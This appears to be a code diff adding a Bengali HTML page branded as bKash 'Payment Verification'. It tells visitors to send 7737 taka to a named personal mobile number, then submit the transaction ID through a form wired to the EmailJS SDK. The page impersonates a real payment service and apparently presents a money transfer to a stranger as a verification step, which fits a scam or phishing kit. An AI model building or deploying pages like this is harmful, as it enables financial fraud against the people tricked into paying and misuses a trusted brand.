@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <title>Payment Verification</title>
+    <link rel="stylesheet" href="style.css">
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() { emailjs.init("YOUR_PUBLIC_KEY"); })(); // এখানে আপনার EmailJS Public Key দিন
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">bKash</div>
+        <div class="payment-box">
+            <span>Payment</span>
+            <div class="amount">৳ 7737</div>
+        </div>
+        
+        <form id="payment-form">
+            <div class="main-card">
+                <h3>ট্রানজেকশন আইডি দিন</h3>
+                <input type="text" id="transaction_id" placeholder="ট্রানজেকশন আইডি দিন" required>
+                <ul>
+                    <li>*247# ডায়াল করে আপনার bKash মোবাইল মেনুতে যান অথবা bKash অ্যাপে যান।</li>
+                    <li>"Send Money"-এ ক্লিক করুন।</li>
+                    <li>গ্রাহক নম্বর হিসেবে এই নম্বরটি লিখুন: <b>01799838285</b></li>
+                    <li>টাকার পরিমাণ: <b>7737</b></li>
+                    <li>নিশ্চিত করতে এখন আপনার bKash মোবাইল মেনু পিন লিখুন।</li>
+                    <li>সবকিছু ঠিক থাকলে, আপনি bKash থেকে একটি নিশ্চয়করণ বার্তা পাবেন।</li>
+                    <li>এখন উপরের বক্সে আপনার <b>Transaction ID</b> দিন এবং নিচে <b>VERIFY</b> বাটনে ক্লিক করুন।</li>
+                </ul>
+                <button type="submit" id="verify-btn">VERIFY</button>
+            </div>
+        </form>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
